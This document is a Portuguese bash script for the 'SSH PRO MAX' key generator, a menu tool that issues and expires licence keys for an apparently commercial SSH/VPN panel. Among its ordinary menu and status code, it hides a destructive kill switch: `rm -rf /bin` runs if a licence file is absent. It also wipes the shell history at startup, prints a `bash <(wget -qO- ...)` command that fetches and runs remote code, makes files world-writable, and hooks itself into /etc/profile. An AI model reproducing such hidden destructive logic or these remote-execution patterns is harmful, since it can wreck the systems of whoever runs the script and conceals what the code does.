#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
barra="\033[0m\e[34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
x="ok"
IP=$(wget -qO- ipv4.icanhazip.com)
while true $x != "ok"
do
clear
if [ ! -e /home/keyscript ]; then
    mkdir /home/keyscript
fi
key_tmp="$RANDOM:$RANDOM"
a="$RANDOM"
b="$RANDOM"
echo "$a" > /tmp/a
echo "$b" > /tmp/b
pasta1=$(cat /tmp/a)
pasta2=$(cat /tmp/b)
signus=":"

mine_port () {
unset portas
portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
i=0
while read port; do
var1=$(echo $port | awk '{print $1}') && var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
[[ "$(echo -e ${portas[@]}|grep "$var1 $var2")" ]] || {
    portas[$i]="$var1 $var2"
    let i++
    }
done <<< "$portas_var"
for((i=0; i<=${#portas[@]}; i++)); do
servico="$(echo ${portas[$i]}|cut -d' ' -f1)"
porta="$(echo ${portas[$i]}|cut -d' ' -f2)"
[[ -z $servico ]] && break
texto="\033[1;31m ${servico}: \033[1;32m${porta}"
     while [[ ${#texto} -lt 35 ]]; do
        texto=$texto" "
     done
echo -ne "${texto}"
let i++
servico="$(echo ${portas[$i]}|cut -d' ' -f1)"
porta="$(echo ${portas[$i]}|cut -d' ' -f2)"
[[ -z $servico ]] && {
   echo -e " "
   break
   }
texto="\033[1;31m ${servico}: \033[1;32m${porta}"
     while [[ ${#texto} -lt 35 ]]; do
        texto=$texto" "
     done
echo -ne "${texto}"
let i++
servico="$(echo ${portas[$i]}|cut -d' ' -f1)"
porta="$(echo ${portas[$i]}|cut -d' ' -f2)"
[[ -z $servico ]] && {
   echo -e " "
   break
   }
texto="\033[1;31m ${servico}: \033[1;32m${porta}"
     while [[ ${#texto} -lt 35 ]]; do
        texto=$texto" "
     done
echo -e "${texto}"
done
}

fun_gerkey () {
echo ""
echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
if [[ -z $client ]]; then
   echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
   sleep 2
   exit 0
fi
echo ""
echo -ne "\033[1;32mDURACAO DA KEY\033[1;33m
(\033[1;31mEX: 20m m=Minutos, h=Horas, d=Dias\033[1;33m)\033[1;37m: "; read _temp
if [[ -z $_temp ]]; then
   echo -e "\033[1;31m Tempo invalido ou vazio\033[0m"
   sleep 2
   exit 0
fi
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
[[ ! -e /var/www/index.html ]] && touch /var/www/index.html > /dev/null 2>&1
mkdir /var/www/$pasta1
mkdir /var/www/$pasta1/$pasta2
touch /home/keyscript/$client
cp /home/lisa /var/www/$pasta1/$pasta2/lisa
cp -a /home/_script_$/. /var/www/$pasta1
chmod 777 /var/www/$pasta1/crz/*
sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa.x.c
mv /var/www/html/$pasta1/$pasta2/lisa.x /var/www/html/$pasta1/$pasta2/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
else
[[ ! -e /var/www/html/index.html ]] && touch /var/www/html/index.html > /dev/null 2>&1
mkdir /var/www/html/$pasta1
mkdir /var/www/html/$pasta1/$pasta2
touch /home/keyscript/$client
cp /home/lisa /var/www/html/$pasta1/$pasta2/lisa
cp -a /home/_script_$/. /var/www/html/$pasta1
chmod 777 /var/www/html/$pasta1/crz/*
sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa.x.c
mv /var/www/html/$pasta1/$pasta2/lisa.x /var/www/html/$pasta1/$pasta2/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
fi
clear
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo ""
echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
echo ""
echo -e "\033[1;32mKEY: \033[1;37m$pasta1$signus$pasta2\033[0m"
echo ""
echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
echo -e "\033[1;32mValidade: \033[1;37m$_temp\033[0m"
echo -e "\033[1;32mVersao: \033[1;37m  $(cat /home/_script_$/crz/versao)\033[0m"
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
echo "#!/bin/bash
#NAME: $client
#KEY: $pasta1$signus$pasta2
#VALIDADE: $_temp
sleep $_temp
rm -rf /var/www/pasta1
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
else
echo "#!/bin/bash
#NAME: $client
#KEY: $pasta1$signus$pasta2
#VALIDADE: $_temp
sleep $_temp
rm -rf /var/www/html/$pasta1
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
fi
bash /home/keyscript/$client &
}

fun_gerkey_fixa () {
echo ""
echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
if [[ -z $client ]]; then
   echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
   sleep 2
   exit 0
fi
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
mkdir /var/www/$pasta1
mkdir /var/www/$pasta1/$pasta2
touch /home/keyscript/$client
cp /home/lisa /var/www/$pasta1/$pasta2/lisa
cp -a /home/_script_$/. /var/www/$pasta1
chmod 777 /var/www/$pasta1/crz/*
sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa.x.c
mv /var/www/html/$pasta1/$pasta2/lisa.x /var/www/html/$pasta1/$pasta2/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
else
[[ ! -e /var/www/html/index.html ]] && touch /var/www/html/index.html > /dev/null 2>&1
mkdir /var/www/html/$pasta1
mkdir /var/www/html/$pasta1/$pasta2
touch /home/keyscript/$client
cp /home/lisa /var/www/html/$pasta1/$pasta2/lisa
cp -a /home/_script_$/. /var/www/html/$pasta1
chmod 777 /var/www/html/$pasta1/crz/*
sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa
rm /var/www/html/$pasta1/$pasta2/lisa.x.c
mv /var/www/html/$pasta1/$pasta2/lisa.x /var/www/html/$pasta1/$pasta2/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
fi
clear
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo ""
echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
echo ""
echo -e "\033[1;32mKEY: \033[1;37m$pasta1$signus$pasta2\033[0m"
echo ""
echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
echo -e "\033[1;32mValidade: \033[1;37mPermanente\033[0m"
echo -e "\033[1;32mVersao: \033[1;37m  $(cat /home/_script_$/crz/versao)\033[0m"
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
echo "#!/bin/bash
#NAME: $client
#KEY: $pasta1$signus$pasta2
#VALIDADE: $_temp
rm -rf /var/www/$pasta1
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
else
echo "#!/bin/bash
#NAME: $client
#KEY: $pasta1$signus$pasta2
#VALIDADE: $_temp
rm -rf /var/www/html/$pasta1
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
fi
# bash /home/keyscript/$client &
}

fun_gerkey_manual () {
echo ""
echo -ne "\033[1;32mNOME DO CLIENTE:\033[1;33m "; read client
if [[ -z $client ]]; then
   echo -e "\033[1;31m Nome invalido ou vazio\033[0m"
   sleep 2
   exit 0
fi
echo ""
echo -ne "\033[1;32mDURACAO DA KEY\033[1;33m
(\033[1;31mEX: \033[1;32m20m m=Minutos, h=Horas, d=Dias\033[1;33m)\033[1;37m: "; read _temp
if [[ -z $_temp ]]; then
   echo -e "\033[1;31m Tempo invalido ou vazio\033[0m"
   sleep 2
   exit 0
fi
echo ""
echo -ne "\033[1;32mDIGITE A KEY [ xxxxxxxx:xxxxxxxx ]\033[1;33m
(\033[1;31mEX: \033[1;32m1234:1234\033[1;33m)\033[1;32m: "; read key
_lnk1=$(echo "$key"|awk -F : '{print $1}')
_lnk2=$(echo "$key"|awk -F : '{print $2}')
echo "$_lnk1" > /tmp/c
echo "$_lnk2" > /tmp/d
key1p=$(cat /tmp/c)
key2p=$(cat /tmp/d)
signus=":"
if [ "$key" = "" ]; then
   echo -e "\033[1;31m key nao alterada\033[0m"
   sleep 2
   exit 0
fi
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
[[ ! -e /var/www/index.html ]] && touch /var/www/index.html > /dev/null 2>&1
[[ ! -d /var/www/$key1p ]] && mkdir /var/www/$key1p
[[ ! -d /var/www/$key1p/$key2p ]] && mkdir /var/www/$key1p/$key2p
touch /home/keyscript/$client
cp /home/lisa /var/www/$key1p/$key2p/lisa
cp -a /home/_script_$/. /var/www/$key1p
chmod 777 /var/www/$key1p/crz/*
sed -i "s/INFO_AK/$key1p/g" /var/www/html/$key1p/$key2p/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$key1p/$key2p/lisa
rm /var/www/html/$key1p/$key2p/lisa
rm /var/www/html/$key1p/$key2p/lisa.x.c
mv /var/www/html/$key1p/$key2p/lisa.x /var/www/html/$key1p/$key2p/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
else
[[ ! -e /var/www/html/index.html ]] && touch /var/www/html/index.html > /dev/null 2>&1
[[ ! -d /var/www/html/$key1p ]] && mkdir /var/www/html/$key1p
[[ ! -d /var/www/html/$key1p/$key2p ]] && mkdir /var/www/html/$key1p/$key2p
touch /home/keyscript/$client
cp /home/lisa /var/www/html/$key1p/$key2p/lisa
cp -a /home/_script_$/. /var/www/html/$key1p
chmod 777 /var/www/html/$key1p/crz/*
sed -i "s/INFO_AK/$key1p/g" /var/www/html/$key1p/$key2p/lisa>/dev/null 2>&1
shc -v -r -f /var/www/html/$key1p/$key2p/lisa
rm /var/www/html/$key1p/$key2p/lisa
rm /var/www/html/$key1p/$key2p/lisa.x.c
mv /var/www/html/$key1p/$key2p/lisa.x /var/www/html/$key1p/$key2p/lisa
cp /home/Get /var/www/html/promax/Get
cp /home/Pro /var/www/html/Pro
fi
clear
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo ""
echo -e "\033[1;37mbash <(wget -qO- scriptpromax.elijahssh.shop/shop)"
echo ""
echo -e "\033[1;32mKEY: \033[1;37m$key1p$signus$key2p\033[0m"
echo ""
echo -e "\033[1;32mUsuario: \033[1;37m $client\033[0m"
echo -e "\033[1;32mValidade: \033[1;37m$_temp\033[0m"
echo -e "\033[1;32mVersao: \033[1;37m  $(cat /home/_script_$/crz/versao)\033[0m"
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
echo "#!/bin/bash
#NAME: $client
#KEY: $key1p$signus$key2p
#VALIDADE: $_temp
sleep $_temp
rm -rf /var/www/$key1p
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
else
echo "#!/bin/bash
#NAME: $client
#KEY: $key1p$signus$key2p
#VALIDADE: $_temp
sleep $_temp
rm -rf /var/www/html/$key1p
rm -rf /var/www/html/promax/Get
rm -rf /var/www/html/Pro
rm -rf /home/keyscript/$client
exit" > /home/keyscript/$client
fi
bash /home/keyscript/$client &
}

fun_keyson () {
echo ""
echo -e "\033[1;32mKEYS ONLINE\033[0m"
echo ""
[ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32m Key Online!\033[1;33m" || echo -e "\033[1;31m Nenhuma Key Online!\033[0m"
echo ""
ls /home/keyscript
}

fun_delkey () {
echo ""
echo -e "\033[1;32mREMOVER KEY ONLINE\033[0m"
echo ""
echo -e "\033[1;33m"
for keyson in $(ls /home/keyscript |sort |sed 's/.sh//g')
do
echo " $keyson"
done
echo ""
echo -ne "\033[1;33mINFORME O NOME: \033[1;32m "; read client
if [ -e /home/keyscript/$client ]; then
    tmp=$(cat /home/keyscript/$client | sed -n '2 p')
    sed -i "s/\b$tmp\b/echo -n/g" /home/keyscript/$client > /dev/null 2>&1
    bash /home/keyscript/$client;
    sleep 2
    echo -e "\n\033[1;32mKEY REMOVIDA !\033[0m"
    else
    echo -e "\n\033[1;31m Key nao existente !\033[0m"
    sleep 2.5s
fi
}

autoe () {
echo ""
if grep "keyscript;" /etc/profile > /dev/null; then
      offautkeyscript () {
         sed -i '/keyscript;/d' /etc/profile
      }
      fun_bar 'offautkeyscript'
      echo ""
      echo -e "\033[1;31mAUTO EXECUÇÃO DESATIVADO!\033[0m"
      sleep 2s
      clear
      keyscript
   else
      autkeyscript () {
         grep -v "^keyscript;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "keyscript;" >> /etc/profile
      }
      fun_bar 'autkeyscript'
      echo ""
      echo -e "\033[1;32mAUTO EXECUÇÃO ATIVADO!\033[0m"
      sleep 2s
      clear
      keyscript
   fi
   }

ativ () {
echo ""
if [ ! -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
#KEYGEN SSH PRO MAX ON
pkill -f 80
apt-get install apache2 -y > /dev/null 2>&1
cp /bin/ports2.conf /etc/apache2/ports2.conf
mv /etc/apache2/ports2.conf /etc/apache2/ports.conf
service apache2 restart > /dev/null 2>&1
echo "#KEYGEN SSH PRO MAX ON" > /var/www/html/1:8%7o.2sg3-q:5
echo ""
echo -e "\033[1;32mIniciado"
echo -e "\033[1;32mRodando Apache2 Porta 80"
sleep 3s
clear
keyscript
else
#KEYGEN SSH PRO MAX OFF
pkill -f 80
cp /bin/ports.conf /etc/apache2/ports.conf
service apache2 restart > /dev/null 2>&1
rm -rf /var/www/html/1:8%7o.2sg3-q:5
echo ""
echo -e "\033[1;31mParado"
echo -e "\033[1;32mRemovido Apache2 Porta 80"
sleep 3s
fi
clear
keyscript
}

anali () {
cd /var/www/html
ls
echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
cd /home/keyscript
ls
echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
echo ""
}

[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
system=$(cat /etc/issue.net)
date=$(date '+%d-%m-%Y <> %H:%M:%S')
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo -e "\033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●●● SSH PRO MAX ●●● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;36m\033[0m"
echo -e "\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m ☆☆☆☆☆   \033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
echo ""
sts=$([ "$(ls -A /home/keyscript)" ] && echo -e "\033[1;32mKey Online!\033[1;37m" || echo -e "\033[1;31mNenhuma Key Online!\033[0m")
echo -e "\033[1;37m STATUS: $sts"
mine_port
echo ""
echo -e "\033[97m$system         $date"
echo -e "\033[01;97m║ \033[44;1;97m▬▬▬▬▬▬▬▬▬▬▬▬ GERADOR SSH PRO MAX ▬▬▬▬▬▬▬▬▬▬▬▬\033[0m \033[01;97m║"
echo -e "\033[1;32m  MEMORIA RAM     PROCESSADOR    \033[1;97mOLINE:\033[1;32m $_onlin\033[0m\033[01;97m  "
echo -e "\033[1;97m  TOTAL:\033[1;32m$_ram\033[1;97mNUCLEO: \033[1;32m$_core      \033[1;97mVENCIDOS:\033[1;31m $_userexp\033[01;97m"
echo -e "\033[1;97m  EM USO:\033[1;31m $_usor\033[1;97mEM USO:\033[1;31m $_usop  \033[1;97m CRIADOS:\033[1;97m $_tuser     \033[01;97m "
echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
echo -e "\033[01;97m║                                               ║"
echo -e "\033[01;97m║ \033[1;32m < 01 > \033[01;97m ● GERAR KEY ALEATORIA                ║\033[0m"
echo -e "\033[01;97m║ \033[1;32m < 02 > \033[0m\033[01;97m ● KEY ALEATORIA FIXA                 ║\033[0m"
echo -e "\033[01;97m║ \033[1;32m < 03 > \033[0m\033[01;97m ● KEY MANUAL                         ║\033[0m"
if [ -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● PARAR KEYGEN \033[1;32m◉                     \033[01;33m║\033[0m"
else
echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● INICIAR KEYGEN \033[1;31m○                   \033[01;33m║\033[0m"
fi
echo -e "\033[01;97m║ \033[1;32m < 05 > \033[0m\033[01;97m ● KEYS ONLINE                        ║\033[0m"
echo -e "\033[01;97m║ \033[1;32m < 06 > \033[0m\033[01;97m ● REMOVER KEY                        ║\033[0m"
echo -e "\033[01;97m║ \033[1;32m < 07 > \033[0m\033[01;97m ● BOT SCRIPT $stsbotteste                        ║\033[0m"
echo -e "\033[01;97m║ \033[1;32m < 08 > \033[0m\033[01;97m ● AUTO EXECUCAO $autm                   \033[01;33m║\033[0m"
echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║"
echo -e "\033[01;97m║ \033[44;1;97m A \033[0m\033[01;97m ● ROOT        \033[44;1;97m B \033[0m\033[01;97m ● VIEW       \033[44;1;97m C \033[0m\033[01;97m ● INFO ║"
echo -e "\033[1;97m╠━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━━═━═━═━═━═━━═━═\033[0m\033[01;97m║" | lolcat -t
echo -e "\033[3;32m                                     VERSAO 3.0.1"
echo -ne "\033[1;97mESCOLHA UMA OPCAO\033[1;33m\033[1;31m\033[1;34m : \033[1;32m"; read x
case $x in
a)
clear
gr0p
;;
b)
anali
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
c)
clear
inv0p
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
1)
fun_gerkey
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
2)
fun_gerkey_fixa
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
3)
fun_gerkey_manual
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
4)
ativ
;;
5)
fun_keyson
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
6)
fun_delkey
echo -ne "\n\033[1;32mENTER \033[1;33mPARA RETORNAR AO \033[1;32mMENU!\033[0m"; read
keyscript
;;
7)
bts0p
;;
8)
clear
autoe
;;
*)
echo -ne "\n\033[1;31mOpcao invalida !\033[0m"; read
exit
ok
esac
done
#fim